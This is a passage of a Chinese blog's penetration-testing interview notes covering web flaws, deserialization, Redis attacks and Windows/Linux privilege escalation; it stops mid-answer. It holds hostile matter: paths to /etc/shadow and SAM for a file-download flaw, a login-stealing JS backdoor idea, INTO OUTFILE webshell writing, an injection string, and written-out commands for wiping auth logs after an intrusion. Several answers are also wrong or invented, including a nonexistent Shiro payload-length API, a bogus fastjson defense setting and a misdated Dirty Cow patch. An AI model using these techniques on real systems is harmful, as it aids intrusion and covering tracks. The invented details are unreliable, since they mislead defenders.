start="13"><li>目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，你觉得这里怎样利用？</li></ol><p>直接爆破用户名。根据报错信息判断出哪些用户是存在的。然后利用爆破出的用户名更改密码。</p><ol start="14"><li>以下条件有什么思路？<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">目标站发现某txt的下载地址为：</span><br><span class="line">http://www.test.com/down/down.php?file=/upwdown/1.txt</span><br></pre></td></tr></table></figure></li></ol><p>下载漏洞。已经知道下载点了，直接尝试下载敏感文件配置文件等。如 <code>linux下可以: /etc/passwd  /etc/shadow   Windows下可以: C:\Windows\win.ini  C:\Windows\repair\sam</code> 。也可以输入index.php下载首页文件，然后在首页文件里查找其它文件网站的配置文件，找出网站的数据库密码和数据库的地址。</p><ol start="15"><li>甲给你一个目标站，并且告诉你根目录下存在&#x2F;abc&#x2F;目录，并且此目录下存在编辑器和admin目录。请问你的想法是？</li></ol><p>直接在网站二级目录 <code>/abc/</code> 下扫描敏感文件及目录。</p><ol start="16"><li>在有shell的情况下，如何使用xss实现对目标站的长久控制？</li></ol><p>后台登录处加一段记录登录账号的JS，并且判断是否登录成功，如果登录成功，就把账号密码记录到一个生僻的路径的文件或直接发到自己的网站文件中。（此方式适合有价值且需要深入控制权限的网络）<br>在登录后才可以访问的文件中插入XSS脚本。</p><ol start="17"><li>发现 demo.jsp?uid&#x3D;110 注入点，你有哪几种思路获取webshell，哪种是优选？</li></ol><p>有写入权限的，构造联合查询语句使用 using INTO OUTFILE，可以将查询的输出重定向到系统的文件中，这样去写入 WebShell 使用 sqlmap –os-shell 原理和上面一种相同，来直接获得一个Shell，这样效率更高。通过构造联合查询语句得到网站管理员的账户和密码，然后扫后台登录后台，再在后台通过改包上传等方法上传 Shell</p><ol start="18"><li>CSRF和XSS和XXE有什么区别，以及修复方式？</li></ol><p>XSS 是跨站脚本攻击，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。修复方式：对字符实体进行转义、使用 HTTP Only 来禁止 JavaScript 读取 Cookie 值、输入时校验、浏览器与 Web 应用端采用相同的字符编码。</p><p>CSRF 是跨站请求伪造攻击，XSS是实现CSRF的诸多手段中的一种，是由于没有在关键操作执行时进行是否由用户自愿发起的确认。修复方式：筛选出需要防范 CSRF 的页面然后嵌入 Token、再次输入密码、检验 Referer</p><p>XXE 是 XML 外部实体注入攻击，XML中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。修复方式：XML 解析库在调用时严格禁止对外部实体的解析。</p><ol start="19"><li>CSRF、SSRF和重放攻击有什么区别？</li></ol><p>CSRF 是跨站请求伪造攻击，由客户端发起<br>SSRF 是服务器端请求伪造，由服务器发起<br>重放攻击是将截获的数据包进行重放，达到身份认证等目的</p><ol start="20"><li>XSS、CSRF、CRLF比较容易弄混，说说三者的原理，防御方法。</li></ol><p>CSRF跨站请求伪造，构造已知的所有参数让对方访问。</p><p>防护CSRF原理：防御原理：不让你那么容易伪造请求（cookie中加入随机数，要求请求中带上，而攻击者获取不到cookie中的随机数，验证HTTP Referer字段，在请求地址中添加token字段）</p><p>CRLF原理：HTTP拆分攻击（HTTP Splitting），CRLF是“回车+换行”（\r\n）的简称。<br>在HTTP协议中，HTTP Header与HTTP body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP内容并显示出来。所以，一旦我们能够控制HTTP消息头的字符，注入一些恶意换行，这样就能注入一些会话Cookie或HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS。</p><ol start="21"><li>owasp漏洞都有哪些？</li></ol><p>(1) 失效的访问控制<br>(2) 加密机制失效<br>(3) 注入<br>(4) 不安全的设计<br>(5) 安全配置错误<br>(6) 易受攻击和过时的组件<br>(7) 识别和认证失败<br>(8) 软件和数据完整性故障<br>(9) 安全日志记录和监控失败<br>(10) 服务端请求伪造SSRF<br><a href="https://www.secrss.com/articles/55490">2023 OWASP API Security Top 10</a><br><a href="https://blog.csdn.net/Gherbirthday0916/article/details/126786601">2022 OWASP</a></p><ol start="22"><li>渗透测试中常见的端口？</li></ol><p>文件共享服务端口：21(FTP), 22(SSH), 69(TFTP)<br>远程连接服务端口：22(SSH), 23(Telnet), 3389(RDP), 5900(VNC)<br>Web应用服务端口：53(DNS), (80, 443, 8080, 8443)(HTTP&#x2F;HTTPS)<br>数据库服务端口：1433(MSSQL), 1521(Oracle), 3306(MySQL), 5432(PostgreSQL)<br>邮件服务端口：25(SMTP), 110(POP3), 143(IMAP)<br><a href="https://blog.51cto.com/jayjaydream/5850365">渗透测试入门15之常见端口安全测试</a><br><a href="https://www.freebuf.com/articles/web/333481.html">常见端口攻击方式</a></p><ol start="23"><li>网站渗透流程</li></ol><p>(1) 信息收集<br>包括目标确认和公开情报收集。<br>(2) 主动探测<br>包括主动扫描，人工浏览、逐个请求burp，自动化。<br>(3) 漏洞挖掘<br>漏洞扫描工具，挖掘漏洞<br><a href="https://www.freebuf.com/articles/web/270202.html">渗透测试全流程总结</a></p><ol start="24"><li>发现一个大范围影响的新漏洞，如何快速排查公司资产？</li></ol><p>(1) 了解漏洞的影响范围。包括漏洞类型、漏洞利用条件、漏洞危害等。根据漏洞影响范围，可以初步判断公司资产是否存在风险。<br>(2) 制定排查方案。根据漏洞的影响范围，制定排查方案。排查方案应包括排查资产范围、排查方法、排查流程、排查工具等。<br>(3) 快速排查资产。排查过程中应重点关注：使用了漏洞软件或设备的资产，存储了敏感数据的资产，连接到互联网的资产。<br>(4) 确认漏洞存在情况。排查完成后，需要确认漏洞是否存在于公司资产中。确认方法可以通过漏扫工具、人工检测等。<br>(5) 采取措施修复漏洞。如果确认漏洞存在，应立即采取措施修复漏洞。措施可采用升级软件、补丁修复等。</p><ol start="25"><li>怎样对一个站去挖nday</li></ol><p>首先进行信息搜集，确认已知漏洞。找到已知漏洞后，我们可以从网上找到已知漏洞的payload，尝试挖掘。</p><ol start="26"><li>跟过哪些nday，怎样一个思路</li></ol><p><a href="https://paper.seebug.org/2033/">WSO2文件上传漏洞</a></p><p><a href="https://www.cnblogs.com/R3col/p/16094132.html">Django SQL注入漏洞</a></p><ol start="27"><li>挖到过0day吗</li></ol><p>没有。</p><ol start="28"><li>代码审计</li></ol><p>有审计过VAudit，使用了Seay源代码审计系统。<br>审计出的漏洞有：<br>(1) 文件包含。源代码未进行严格过滤，仅添加后缀inc。直接创建shell.inc文件，写一句话木马。蚁剑连接成功。<br>(2) sql注入。在留言界面未对用户输入的id字段做检测，仅有敏感字符替换。因为替换字段中 <code>||</code> 被替换为空，所以我们可将其插入到敏感字符中间绕过。<br>(3) 反射型XSS。搜索留言处存在。<br>(4) 登录次数未做限制可爆破。登录处，管理员账户。无验证可python爆破，有验证burp爆破。<br>(5) 命令执行。<br>(6) 任意文件读取。查看avatar.php源代码：存在危险函数 <code>file_get_contents</code> ，通过代码审计发现 <code>$_SESSION[&#39;avatar&#39;]</code> 。数据可控。<br>(7) 安装漏洞。查看install.php的代码时就算存在install.lock文件依然会执行后面的代码，数据库连接参数由用户上传可控，仅对dbname做了重复检测，未对参数进行校验，可进行SQL注入。使用反引号使SQL语句合法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`&quot;;phpinfo();//`</span><br></pre></td></tr></table></figure><p>跟着文章审计过XXE漏洞。解密通达OA后，在日程安排功能点处，发现导入日程的说明描述是可上传XML格式文档。那么也可能解析XML实体，于是抓包去路由，查看版本并利用。详看文章。</p><p><a href="https://blog.csdn.net/akucoco/article/details/129032037">VAudit代码审计从0到1，思路记录</a><br><a href="https://www.freebuf.com/articles/web/341238.html">如何通过代码审计大型OA系统拿到CNVD证书</a><br><a href="https://juejin.cn/post/7129298288389390367">PHP代码审计（六）Seay源代码审计系统使用教程</a></p><ol start="29"><li>app渗透经历</li></ol><p>做过一个app渗透，大概是在去年暑假刚开始的时候，身边有个人被诈骗了。是在某个app内，所以我就尝试进行app渗透。如下：<br><a href="https://www.wangan.com/p/7fy7fx71176412a7">实战|从app渗透到网站沦陷</a><br><a href="https://blog.csdn.net/weixin_40228200/article/details/128474830">APP应用渗透测试思路</a></p><ol start="30"><li>redis利用姿势及环境差异</li></ol><p><strong>Linux</strong>：<br>(1) 未授权访问：默认直接绑定在0.0.0.0:6379，密码为空，未对ip、端口等限制，攻击者可未授权访问redis，轻则获取数据，重则配合其它漏洞取得服务器权限。redis3.2版本新增protected-mode，默认yes，外部网络无法访问redis服务。<br>利用方式：直接nmap扫描，然后直连。<br>(2) 利用config写配置文件。<br>利用方式：直连到redis后，一句话木马写入webshell。<br>Ubuntu下利用定时任务反弹shell<br>(3) 模块加载rce。redis4.0以上区别于以下的版本在于其多出一个模块，允许我们加载外部的so文件，实现在redis内执行我们的自定义命令，可以理解我们可以自写插件来扩展redis的功能。<br>利用方式：如果拿到webshell之后，登录redis后通过webshell上传动态链接库即so文件后，通过redis的moudle load加载动态链接库即可rce。权限一般可满足<br>(4) 主从复制RCE。主从复制是指将一台redis服务器的数据，复制到其它的redis服务器。前者称之为主节点(master)，后者称之为(slave)；主从复制是单向的，只能由主节点到从节点。<br>利用方式：通过全量复制。尝试在服务器中nc一个端口，然后我们的redis用slaveof命令<br>(5) SSRF打redis。SSRF因为一个gopher协议大大拓宽了攻击面，使用过gopher的会知道我们需要对需要发送的包进行抓包然后编码通过gopher协议进行发送。<br>利用方式：根据redis的数据格式伪造将webshell、ssh、定时任务等进行编码后通过gopher协议发送到存在着redis的机器上，就可以达成ssrf打redis。</p><p><strong>Windows</strong>：<br>(1) 写无损文件。<br>利用方式：使用工具RedisWriteFile。<br>(2) getshell。<br><a href="https://blog.csdn.net/weixin_50464560/article/details/121095951">Redis利用方式总结(Linux&#x2F;Windows)</a></p><ol start="31"><li>fastjson回显</li></ol><p>fastjson回显是指在使用fastjson解析json数据时，由于fastjson存在反序列化漏洞，攻击者可以通过构造恶意json数据，将恶意代码注入到服务端，从而实现远程代码执行、数据库操作等攻击。</p><p>fastjson回显漏洞主要存在于fastjson的 <code>JSON.parse()</code> 方法中，该方法用于将json字符串解析为Java对象。fastjson在解析json数据时，会将json字符串中的所有键值对都转换为Java对象，其中包括恶意代码。</p><p>利用BCEL打fastjson直接burp回显getshell<br>基于dbcp的fastjson rce回显<br>fastjson &lt;&#x3D; 1.2.24</p><p>防御：<br>升级fastjson到最新版本，最新版本已经修复了该漏洞。<br>在fastjson的配置文件中，设置 <code>deserializerFeatures</code> 属性为 <code>SerializerFeature.DisableFeatures.AUTO_DESERIALIZE_ENUM</code> ，该属性可以禁止fastjson自动反序列化枚举类型，从而防止攻击者利用枚举类型进行攻击。<br>使用第三方安全工具进行检测和修复。</p><ol start="32"><li>jndi注入及原理</li></ol><p>JDNI注入是指攻击者通过控制JNDI查询参数，将恶意代码或对象注入到JNDI服务中，从而导致远程代码执行的漏洞.<br>JNDI(Java Naming and Directory Interface)是Java提供的命名和目录接口。通过调用JNDI的API可以定位资源和其它程序对象。<br>JNDI是Java EE的重要部分，JNDI可访问的现有目录及服务有：JDBC, LDAP, RMI, DNS, NIS, CORBA.</p><p>JNDI注入，即当开发者在定义JNDI接口初始化时， <code>lookup()</code> 方法的参数可控，攻击者就可以将恶意的url传入参数远程加载恶意载荷，造成注入攻击。</p><p><a href="https://xz.aliyun.com/t/12277">JNDI注入原理及利用考究</a></p><ol start="33"><li>Java回显</li></ol><p>(1) defineClass<br>(2) RMI绑定实例<br>(3) URLClassLoader抛出异常<br>(4) 中间件<br>(5) 写文件css、js<br>(6) dnslog</p><p><a href="https://xz.aliyun.com/t/7740">Java 反序列化回显的多种姿势</a></p><ol start="34"><li>泛微oa xstream的回显(jdk1.8和jdk1.7的差异)</li></ol><p><a href="https://cangqingzhe.github.io/2021/05/15/%E6%B3%9B%E5%BE%AEXstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">泛微xstream</a></p><ol start="35"><li>shiro限制payload长度</li></ol><p>Shiro是一个流行的Java安全框架，可以作为应用程序的身份验证和授权解决方案。<br>在Shiro中，有一个限制payload长度的设置可以增加应用程序的安全性。<br>shiro限制payload长度的主要方法是设置SecurityManager的subjectFactory属性。subjectFactory属性用于创建subject对象，可以通过设置该属性的maxPayloadLength属性来限制payload的长度。<br>示例如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">DefaultSubjectFactory</span> <span class="variable">subjectFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultSubjectFactory</span>();</span><br><span class="line">subjectFactory.setMaxPayloadLength(<span class="number">1024</span>);</span><br><span class="line"><span class="type">SecurityManager</span> <span class="variable">securityManager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultSecurityManager</span>(subjectFactory);</span><br></pre></td></tr></table></figure><p>该配置将限制payload的长度为1024字节。</p><p>除此之外还有：<br>在shiro的配置文件中设置SecurityFilterChain的filters属性。filters属性用于指定shiro的过滤器链，可以通过添加PayloadLengthFilter过滤器来限制payload的长度。<br>在shiro的配置文件中设置SecurityManager的subjectFactory属性的maxPrincipalLength属性。maxPrincipalLength属性用于限制principal的长度，principal是用于表示用户身份的对象。</p><ol start="36"><li>Java回显的通用思路以及不同版本jdk的差异</li></ol><p>Java回显的通用思路：<br>1、选择回显通道：首先，选择一个通道，通过该通道可以接收到目标系统的响应。通常使用的回显通道包括DNS、HTTP、SMTP等。<br>2、构造恶意Java对象：创建一个Java对象，该对象会在目标系统中触发漏洞或执行特定操作。通常，这需要深入了解目标系统上的漏洞或弱点，并构造适当的Java序列化对象来利用这些弱点。<br>3、序列化和发送对象：使用Java的序列化机制，将恶意对象序列化为字节流。然后，通过选择的通道将字节流发送到目标系统。<br>4、等待回显：监视回显通道，等待目标系统的响应。响应通常是由目标系统执行恶意对象引发的操作所触发的。<br>5、解析和分析回显：一旦收到回显，解析响应以确定是否成功触发了漏洞或执行了目标操作。这可能包括查看响应内容、状态码、错误消息等。<br>6、根据结果采取行动：根据回显的结果，确定目标系统是否受到漏洞的影响，并采取进一步的行动，例如报告漏洞或利用漏洞。</p><p>jdk7 存在Apache Commons Collections中的Collections.unrollMap方法的反序列化漏洞，可执行任意代码。安全配置方面：开发人员可以使用ObjectInputFilter来配置白名单规则以确保反序列化处理的对象合法可信，并使用 Javadoc 文档中提供的安全基线配置来提高安全性。<br>引入了新的特性，如try-with-resources语句，有助于更安全地处理资源关闭。</p><p>jdk8 存在Apache Commons Collections中的TransformerFactory.getClassLoader方法的反序列化漏洞，可被攻击者利用获取敏感信息。安全配置：引入了强化的Java安全管理器（Java Security Manager），默认情况下禁用了许多危险的操作。引入了全新的安全特性，如Strengthening Password-based Encryption，增强了密码散列算法（例如PBKDF2）。</p><p>jdk9 引入了模块化系统（Project Jigsaw），提供更好的代码隔离和控制，有助于减少潜在的安全问题。<br>引入了多版本JAR文件，有助于解决一些依赖性问题，从而提高安全性。</p><p>jdk11 JDK的ssl库存在信息泄露漏洞，攻击者可以针对受害者获取机密的信息。安全配置有通过设置Java安全管理器的allowList属性来指定允许反序列化的类。是一个LTS（长期支持）版本，将在较长时间内接收安全补丁和维护。引入了新的HTTP客户端（替代HttpURLConnection），提供更好的性能和安全性。</p><ol start="37"><li>Rootkit是什么意思</li></ol><p>rootkit是一种恶意软件，它可以隐藏自身和其它恶意软件，从而使攻击者可以获取对受感染系统的完全控制。rootkit通常使用系统漏洞来安装，并使用各种技术隐藏自身和其它恶意软件。</p><p>常见类型：<br>内核rootkit：内核rootkit是安装在操作系统内核中的rootkit，可访问和修改操作系统的所有部分，使其非常难以检测和删除。<br>文件系统rootkit：文件系统rootkit是安装在文件系统中的rootkit。文件系统rootkit可以隐藏自身和其他恶意软件，使其难以检测和删除。<br>网络rootkit：网络rootkit是用于攻击网络的rootkit。网络rootkit可以用于窃取敏感信息、进行远程攻击或破坏系统。</p><p>rootkit示例：Stuxnet, Flame, Necurs.</p><p>检测：比较困难。可根据特征推测，如蓝屏，异常网络浏览器行为，设备性能缓慢，Windows设置未经许可修改，网页运行不正常。<br>清除：如果有深度感染唯一办法是重装系统。<br><a href="https://www.kaspersky.com.cn/resource-center/definitions/what-is-rootkit">什么是 Rootkit</a></p><ol start="38"><li>手工查找后门木马的小技巧</li></ol><p>1、首先最需要注意的地方是系统的启动项，可以在“运行”-输入“msconfig 命令” 在打开的系统配置实用程序里的启动列表查看，并且服务也要注意一下，如果对电脑不是太熟悉建议使用 360 安全卫士的开机加速功能，来查看有无异常的可以启动项和服务项，因为在后门木马中大部分都会注册自己为系统服务，达到开机自启动的目的，如果发现可疑项直接打开相应的路径，找到程序文件，直接删除并且禁止自启动；</p><p>2、查看系统关键目录 system32 和系统安装目录 Windows 下的文件，xp 系统下两者默认路径分别是 C:\WINDOWS\system32 和 C:\WINDOWS\。然后最新修改的文件中有没有可疑的可执行文件或 dll 文件，这两个地方都是木马最喜欢的藏身的地方了（小提示：一定要设置显示所有的文件的文件夹哦）。</p><p>3、观察网络连接是否存在异常，还有“运行”-“cmd”- <code>netstat -an</code> 查看有没有可疑或非正常程序的网络连接，如果对电脑不是很熟悉建议大家使用 360 的流量监控功能更加直观和方便，尤其注意一下远程连接的端口，如果有类似于 8000 等端口就要注意了，8000 是灰鸽子的默认端口，记得有一次自己就在后门木马测试中在网络连接中发现 8000 端口，当然意思不是说只要没有 8000 端口的网络连接就一定安全，因为 8000 端口只是灰鸽子上线的默认端口，并且端口是可以更改的。</p><p>通过以上方法，可以查找到电脑的一些可疑文件，如果确认无疑，就可以手工进行删除了。当然还可以借助杀毒软件的力量。如果你真的中了木马后门，不用慌。最好最彻底的方法是重装系统后，在安全模式下，利用最新病毒库的杀软进行查杀。</p><ol start="39"><li>常见web安全漏洞</li></ol><p>sql注入，文件上传，xss，文件包含，CSRF，SSRF，XXE，SSTI，反序列化，RCE，目录穿越，逻辑漏洞，中间件。</p><ol start="40"><li>永恒之蓝的漏洞原理是什么？怎么做到的？</li></ol><p>原理：攻击者可以通过发送一个特制的SMB请求，导致Windows内核中的SmbSessionNegotiate函数发生缓冲区溢出。攻击者可以利用该漏洞执行任意代码，从而获得对受感染系统的完全控制。<br>漏洞类型：缓冲区溢出。<br>漏洞危害：攻击者可以利用该漏洞执行任意代码，从而获得对受感染系统的完全控制。</p><ol start="41"><li>针对PHP的弱类型，有哪些漏洞？</li></ol><p>(1) 类型转换漏洞：由于PHP的弱类型变量，在进行比较运算时会自动进行类型转换，攻击者可以利用此特性来触发特定的条件判断。例如，攻击者可以在比较两个值时传递一个特殊的参数，导致预期以外的结果。<br>(2) 对象漏洞：PHP中的对象也可以受到弱类型的影响，可能导致意外行为。要防范此类问题，应该在操作对象之前验证其类型和属性。<br>(3) 比较漏洞：PHP中的比较操作符（例如&#x3D;&#x3D;）在比较不同数据类型时可能会导致问题。攻击者可以利用类型弱化来绕过预期的条件。<br>(4) 数组漏洞：PHP中的数组也可以是弱类型的，这可能导致问题。例如，如果未初始化一个数组并尝试访问其元素，PHP可能会自动将数组初始化为空数组。为了防止这种情况，建议始终明确初始化数组并验证输入。<br>(5) SQL注入漏洞：由于弱类型变量的存在，攻击者可以通过传递恶意的SQL查询来注入数据库。攻击者可以伪造一个查询或输入等操作，绕过服务器端的验证和过滤机制，最终达到执行数据库操作的目的。</p><p>采取措施：<br>为了防范PHP中的弱类型漏洞，建议进行严格的输入验证、类型检查和转换，并使用适当的安全编码实践来确保应用程序的安全性。</p><ol start="42"><li>代码审计方面，有过对大型cms的审计吗？发现过哪些漏洞？</li></ol><p>同28题。</p><ol start="43"><li>针对PHP的语言特点，说几个常见漏洞？</li></ol><p>同41题。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol><li><p><a href="https://docs.qq.com/doc/DSlByWEZoaWx4U3la">2022渗透测试面试问题搜集</a></p></li><li><p><a href="https://zhuanlan.zhihu.com/p/511394956">干货 | 80篇+网络安全面试经验帖(第25篇还没看)</a></p></li><li><p><a href="https://blog.51cto.com/u_15474183/5535532">2023级网络安全岗面试题及面试经验分享</a></p></li><li><p><a href="https://zhuanlan.zhihu.com/p/566448154">2023届网络安全岗秋招面试题及面试经验分享</a></p></li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;可以不用，但不能没有。&lt;/p&gt;</summary>
    
    
    
    <category term="面试" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95/"/>
    
    <category term="web漏洞" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95/web%E6%BC%8F%E6%B4%9E/"/>
    
    
    <category term="面试" scheme="http://example.com/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>面试准备之系统篇</title>
    <link href="http://example.com/2023/09/03/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E4%B9%8B%E7%B3%BB%E7%BB%9F%E7%AF%87/"/>
    <id>http://example.com/2023/09/03/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E4%B9%8B%E7%B3%BB%E7%BB%9F%E7%AF%87/</id>
    <published>2023-09-02T16:00:00.000Z</published>
    <updated>2023-10-10T07:57:45.581Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>了解系统，才能更好攻击与防御。</p><span id="more"></span><h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><ol><li>CMD命令行如何查询远程终端开放的端口。</li></ol><p><code>netstat -an</code></p><ol start="2"><li>Windows认证协议</li></ol><p>NTLM, NTLM（NT LAN Manager）是Windows早期版本中使用的认证协议。NTLM使用挑战&#x2F;响应机制来验证用户身份。<br>Kerberos, Kerberos是Windows Server 2000中引入的认证协议。Kerberos使用密钥交换机制来验证用户身份。<br>NTLMv2, NTLMv2是NTLM的改进版本。NTLMv2使用更安全的哈希算法来保护用户密码。<br>Negotiate, Negotiate是Windows Server 2003中引入的认证协议。Negotiate允许客户端和服务器协商使用哪种认证协议。</p><ol start="3"><li>Windows怎么提权</li></ol><p>(1) 内核溢出提权–未打漏洞补丁，可以通过metasploit信息收集，手工信息收集systeminfo等。</p><p>(2) 系统配置错误提权<br>2.1 权限配置错误<br>2.2 可信任服务器路径漏洞<br>2.3 不安全的注册表权限配置<br>2.4 启用注册表键AlwaysInstallElevated</p><p>(3) 组策略首选项提权</p><p>(4) bypassUAC提权</p><p>(5) 令牌窃取</p><p>(6) 数据库提权</p><h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><ol><li>Linux服务器的安全运维操作有哪些？如何保护SSH？</li></ol><p>Linux安全运维：<br>(1) 删除特殊的用户和用户组：默认安装很多不必要的用户和用户组，不需要即删除。可删的如adm、lp、sync、shutdown、halt<br>(2) 关闭系统不需要的服务：默认绑定很多没用的服务是自启动，根据服务器用途不需要即删除。一般可删的如：auditd, ip6tables kdump<br>(3) 合理使用su、sudo命令：sudo执行命令的流程是：将当前用户切换到超级用户下，或切换到指定的用户下，然后以超级用户或其指定切换到的用户身份执行命令，执行完成后，直接退回到当前用户，而这一切的完成要通过sudo的配置文件&#x2F;etc&#x2F;sudoers来进行授权。<br>(4) 删减系统登录欢迎信息：虽然欢迎信息或版本信息能给系统管理者带来一定的方便，但是这些信息可能被利用，为了保证系统安全，可以修改或删除某些系统文件，这样的文件有: <code>/etc/issue  /etc/issue.net  /etc/redhat-release  /etc/motd</code><br>(5) 禁止Control-Alt-Delete键盘关闭命令：默认同时按下Control-Alt-Delete组合键，系统将自动重启，这个策略不安全，因此禁止。<br>(6) 合理使用shell历史命令记录功能：linux下可通过history命令查看用户所有的历史操作记录，同时shell命令操作记录默认保存在用户目录下的.bash_history文件中，通过这个文件可以查询shell命令的执行历史，有助于运维人员进行系统审计和问题排查<br>(7) 启动tcp_wrappers防火墙：tcp_wrappers是一个用来分析TCP&#x2F;IP封包的软件，类似的IP封包软件还有iptables。</p><p>保护SSH：<br>(1) 改变默认端口<br>(2) 不要使用密码，通过密钥连接<br>(3) 决定谁可以登录，连接IP限制<br>(4) 禁用root用户登录<br>(5) 限制登录访问尝试<br>(6) 使用SSH 版本2</p><ol start="2"><li>入侵Linux服务器后需要清除哪些日志？</li></ol><p>删除bash历史记录<br>需要清理的日志记录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/var/log/auth.log  认证</span><br><span class="line">/var/log/cron.log  Cron任务</span><br><span class="line">/var/log/maillog   邮件</span><br><span class="line">/var/log/httpd    Apache</span><br></pre></td></tr></table></figure><p>注意：清理方式是将文件清空，而不是将其完全擦除。<br>使用truncate命令将文件大小减少到0： <code>truncate -s 0 /var/log/auth.log</code><br>通过将nothing映射到文件来完成： <code>echo &quot; &gt; /var/log/auth.log</code><br>还可以单独使用&gt;来清理文件： <code>&gt; /var/log/auth.log</code><br>也可以发送到&#x2F;dev&#x2F;null： <code>cat /dev/null &gt; /var/log/auth.log</code><br>使用tee命令： <code>true | tee /var/log/auth.log</code></p><ol start="3"><li>Linux提权的姿势</li></ol><p>(1) 内核漏洞提权–DirtyCow<br>(2) 定时任务提权<br>(3) SUID提权<br>(4) Sudo滥用提权<br>(5) 外壳逃生序列<br>(6) NFS提权<br>(7) Password &amp; Key 提权<br>(8) Docker提权</p><ol start="4"><li>Linux下有哪些文件进行渗透时比较关注的，以及文件权限问题</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">/apache/apache/conf/httpd.conf</span><br><span class="line">/apache/apache2/conf/httpd.conf</span><br><span class="line">/apache/php/php.ini</span><br><span class="line">/bin/php.ini</span><br><span class="line">/etc/anacrontab</span><br><span class="line">/etc/apache/apache.conf</span><br><span class="line">/etc/apache/httpd.conf</span><br><span class="line">/etc/cron.allow</span><br><span class="line">/etc/cron.deny</span><br><span class="line">/etc/crontab</span><br><span class="line">/etc/shadow</span><br><span class="line">/etc/httpd/logs/access.log</span><br><span class="line">/etc/httpd/logs/access_log</span><br><span class="line">/etc/httpd/logs/error.log</span><br><span class="line">/etc/httpd/logs/error_log</span><br><span class="line">/etc/httpd/php.ini</span><br><span class="line">/etc/networks</span><br><span class="line">/etc/passwd</span><br><span class="line">/etc/php/php.ini</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/weixin_43847838/article/details/127886311">Linux渗透中常见的敏感目录或文件</a></p><p>文件权限：<br>chown (change owner) ： 修改所属用户与组。<br>chmod (change mode) ： 修改用户的权限。<br>使用 ll 或者 ls –l 命令来显示一个文件的属性以及文件所属的用户和组<br>r-4 代表可读(read)、 w-2 代表可写(write)、 x-1 代表可执行(execute)。 要注意的是，这三个权限的位置不会改变，如果没有权限，就会出现减号 - 而已。<br><img src="/simg/system_1.jpg" alt=" "></p><ol start="5"><li>dirty cow的时间及其修复版本（哪年后无法使用）</li></ol><p>自2007 年9 月发布的2.6.22 版本起就存在于Linux 内核中<br>2017 年 11 月 27 日发布了补丁来修复该问题。</p><ol start="6"><li>列举Linux反弹shell的一些方法</li></ol><p>(1) 利用netcat反弹shell<br>(2) 利用bash反弹shell<br>(3) Curl配合bash反弹shell<br>(4) 将反弹shell的命令写入&#x2F;etc&#x2F;profile文件<br>(5) 利用Socat反弹shell<br>(6) 利用Telnet反弹shell<br>(7) 利用awk反弹shell<br>(8) 各种脚本反弹shell</p><ol start="7"><li>Linux系统中etc&#x2F;password和&#x2F;shadow文件的区别</li></ol><p><code>/etc/passwd</code> 存储一般的用户信息，任何人都可以访问<br><code>/etc/shadow</code> 存储用户的密码信息，只有 root 用户可以访问<br><a href="https://howiezhao.github.io/2018/04/29/passwd-and-shadow/">Linux 中&#x2F;etc&#x2F;passwd 与&#x2F;etc&#x2F;shadow 的区别</a></p><ol start="8"><li>Linux如何查看当前权限</li></ol><p>查看当前用户: <code>whoami</code><br>查看登录用户: <code>who</code><br>查看有哪些用户组: <code>cat /etc/group</code><br>查看用户在哪些组: <code>groups</code></p><ol start="9"><li>对Linux了解吗？Linux内核漏洞有没有分析过？</li></ol><p>有一定程度的了解。</p><p>经典的Dirty Cow。漏洞形成原因：写时拷贝技术</p><p>和新内核漏洞的利用方法：<br>(1) pipe管道技术<br>(2) kernel5.x版本和kernal4.x版本的利用方法</p><p>Linux内核保护与绕过<br>(1) KASLR保护<br>(2) SMEP&amp;SMAP保护<br>(3) KPTI保护</p><p><a href="https://paper.seebug.org/2050/">Linux 内核常用保护和绕过技术</a></p><ol start="10"><li>你说你对堆栈溢出有了解，那玩过pwn吗？</li></ol><p>无</p><ol start="11"><li>如果对方开启了ASLR和DEP，要如何绕过？</li></ol><p>先泄漏出libc.so某些函数在内存中的地址，然后再利用泄漏出的函数地址根据偏移量计算出system()函数和 <code>/bin/sh</code> 